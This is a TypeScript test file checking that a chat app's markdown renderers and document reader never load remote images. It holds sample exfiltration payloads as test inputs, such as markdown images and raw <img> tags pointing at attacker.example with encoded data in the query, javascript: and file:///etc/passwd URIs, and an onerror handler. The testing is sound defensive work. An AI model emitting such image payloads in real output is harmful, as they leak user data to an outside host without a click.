/**
 * Chat replies and the reasoning panel render model output, and the document
 * reader renders imported text through the same component. A remote image
 * there loads as soon as it renders, so ![x](https://host/?d=...) would send
 * data out with no click. Both renderers never emit an <img> for markdown;
 * an image from another site is shown as a link the learner can open. (The
 * app's own images, figures, drawings and photos, are separate <img>
 * elements that do not render through markdown.)
 *
 * Classic JSX transform under tsx: React must be a global (see
 * render-markdown.test.tsx).
 */
import React from "react";
(globalThis as Record<string, unknown>).React = React;

import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { renderToStaticMarkup } from "react-dom/server";
import { DocumentReaderBody } from "../components/document-reader.tsx";
import { MessageResponse } from "../components/ai-elements/message.tsx";
import { Reasoning, ReasoningContent } from "../components/ai-elements/reasoning.tsx";

const renderers = {
	message: (md: string) => renderToStaticMarkup(<MessageResponse mode="static">{md}</MessageResponse>),
	reasoning: (md: string) => renderToStaticMarkup(<Reasoning open><ReasoningContent>{md}</ReasoningContent></Reasoning>),
};

const pixel = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==";

for (const [name, render] of Object.entries(renderers)) {
	describe(`${name}: remote images`, () => {
		it("a markdown image to another host renders as a link with the alt text, never an <img>", () => {
			const html = render("Here is the chart: ![chart](https://attacker.example/c.png?d=c2VjcmV0)");
			assert.doesNotMatch(html, /<img/);
			assert.doesNotMatch(html, /attacker\.example/);
			assert.match(html, /<button[^>]+data-streamdown="link"[^>]*>chart<\/button>/);
		});

		it("without alt text the link shows the address", () => {
			const html = render("![](https://attacker.example/c.png)");
			assert.doesNotMatch(html, /<img/);
			assert.match(html, /<button[^>]+data-streamdown="link"[^>]*>https:\/\/attacker\.example\/c\.png<\/button>/);
		});

		it("raw HTML <img> and plain-http images are blocked the same way", () => {
			for (const md of ['<img src="https://attacker.example/p.png?d=x" alt="p">', "![p](http://attacker.example/p.png)", "![p](//attacker.example/p.png)"]) {
				const html = render(md);
				assert.doesNotMatch(html, /<img/, md);
				assert.doesNotMatch(html, /attacker\.example/, md);
			}
		});

		it("nothing preloads a remote image either", () => {
			assert.doesNotMatch(render("![chart](https://attacker.example/c.png)"), /rel="preload"/);
		});

		it("Streamdown's default pipeline is still raw, sanitize, harden (the list in message.tsx names them)", async () => {
			const { defaultRehypePlugins } = await import("streamdown");
			assert.deepEqual(Object.keys(defaultRehypePlugins), ["raw", "sanitize", "harden"]);
		});

		it("relative and same-origin paths are not images in markdown either", () => {
			for (const md of ["![p](/image.png)", "![p](./image.png)", "![p](http://localhost/image.png)"]) {
				assert.doesNotMatch(render(md), /<img/, md);
			}
		});

		it("a data: raster image still displays: it makes no network request", () => {
			for (const type of ["png", "jpeg", "gif", "webp"]) {
				const html = render(`![dot](data:image/${type};base64,AAAA)`);
				assert.match(html, new RegExp(`<img[^>]+src="data:image/${type};base64,AAAA"`), type);
			}
			assert.match(render(`![dot](${pixel})`), /<img[^>]+src="data:image\/png;base64,iVBOR/);
		});

		it("a kept data: image carries only src, alt, title, width and height", () => {
			const html = render(`<img name=body id=x usemap="#m" longdesc="https://attacker.example/d" align=left class=y style="width:1px" data-k=v onerror="alert(1)" alt="dot" title="t" width="8" height="9" src="${pixel}">`);
			const tag = html.match(/<img[^>]*>/)?.[0] ?? "";
			assert.ok(tag, html);
			assert.doesNotMatch(tag, /\b(name|id|usemap|longdesc|align|style|onerror|data-k)=/);
			assert.doesNotMatch(html, /attacker\.example/);
			for (const a of ['alt="dot"', 'title="t"', 'width="8"', 'height="9"']) assert.ok(tag.includes(a), a);
			assert.ok(tag.includes(`src="${pixel}"`));
		});

		it("a kept data: image is a bare <img>: no block element inside a paragraph or a link button", () => {
			for (const md of [`before ![dot](${pixel}) after`, `[![dot](${pixel})](https://example.com/page)`, `[text ![dot](${pixel})](https://example.com/page)`]) {
				const html = render(md);
				assert.match(html, /<img/, md);
				assert.doesNotMatch(html, /<div[^>]*data-streamdown="image-wrapper"/, md);
				assert.doesNotMatch(html, /<(p|button)\b(?:(?!<\/(?:p|button)>)[\s\S])*<div/, md);
				assert.match(html, /<img[^>]*class="[^"]*max-w-full/, md);
			}
		});

		it("other data: images and schemes stay blocked", () => {
			for (const md of [
				"![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)",
				"![x](data:text/html;base64,PGI+PC9iPg==)",
				"![x](DATA:image/png;base64,AAAA)",
				"![x](javascript:alert(1))",
				"![x](file:///etc/passwd)",
				"![x](blob:https://example.com/0000)",
			]) {
				assert.doesNotMatch(render(md), /<img/, md);
			}
		});

		it("a protocol-relative image becomes a link to the https address", () => {
			const html = render("![p](//attacker.example/p.png)");
			assert.doesNotMatch(html, /<img/);
			assert.doesNotMatch(html, /Image blocked/);
			assert.match(html, /<button[^>]+data-streamdown="link"[^>]*>p<\/button>/);
			assert.match(render("![](//attacker.example/p.png)"), />https:\/\/attacker\.example\/p\.png<\/button>/);
		});

		it("an upper-case scheme is blocked too (the sanitize step drops its address, so it is a badge)", () => {
			for (const md of ["![c](HTTPS://attacker.example/c.png)", '<img src="HTTP://attacker.example/c.png" alt="c">']) {
				const html = render(md);
				assert.doesNotMatch(html, /<img/, md);
				assert.doesNotMatch(html, /attacker\.example/, md);
				assert.match(html, /\[Image blocked: c\]/, md);
			}
		});

		it("an image inside a link is its alt text inside that one link, never a nested link", () => {
			for (const md of [
				"[![badge](https://attacker.example/b.svg)](https://example.com/page)",
				'<a href="https://example.com/page"><img src="https://attacker.example/b.svg" alt="badge"></a>',
				'<a href="https://example.com/page"><b><img src="//attacker.example/b.svg" alt="badge"></b></a>',
			]) {
				const html = render(md);
				assert.equal(html.match(/<button/g)?.length, 1, md);
				assert.doesNotMatch(html, /<a[ >]/, md);
				assert.doesNotMatch(html, /<img/, md);
				assert.doesNotMatch(html, /attacker\.example/, md);
				assert.match(html, /<button[^>]+data-streamdown="link"[^>]*>(<b>)?badge(<\/b>)?<\/button>/, md);
			}
			assert.match(render("[![](https://attacker.example/b.svg)](https://example.com/page)"), /<button[^>]*>https:\/\/attacker\.example\/b\.svg<\/button>/);
		});

		it("<picture><source srcset> and srcset never leave another host in the output", () => {
			for (const md of [
				'<picture><source srcset="https://attacker.example/a.png 2x"><img src="https://attacker.example/b.png" alt="b"></picture>',
				'<picture><source srcset="https://attacker.example/a.png"><img src="/local.png" alt="b"></picture>',
				'<img src="/local.png" srcset="https://attacker.example/a.png 2x" alt="b">',
			]) {
				const html = render(md);
				assert.doesNotMatch(html, /<img|<source|srcset|<picture/i, md);
				assert.doesNotMatch(html, /attacker\.example/, md);
			}
		});

		it("links are unchanged: still Streamdown's link button", () => {
			const html = render("[the paper](https://example.com/paper)");
			assert.match(html, /<button[^>]+data-streamdown="link"[^>]*>the paper<\/button>/);
		});
	});
}

describe("document reader: remote images", () => {
	it("an imported document cannot load a remote image either; it shows a link", () => {
		const meta = {
			id: "doc_aaaaaaaaaaaa", contentHash: "h", title: "Notes", summary: "", topics: [], filenames: ["n.md"],
			importedAt: "2026-10-01T10:00:00.000Z", updatedAt: "2026-10-01T10:00:00.000Z", origin: "markdown" as const, sections: [], sourceId: "doc_aaaaaaaaaaaa",
		};
		const html = renderToStaticMarkup(<DocumentReaderBody meta={meta} markdown={"# Notes\n![fig](https://attacker.example/f.png?d=x)"} />);
		assert.doesNotMatch(html, /<img/);
		assert.doesNotMatch(html, /attacker\.example/);
		assert.match(html, /data-streamdown="link"[^>]*>fig<\/button>/);
	});
});
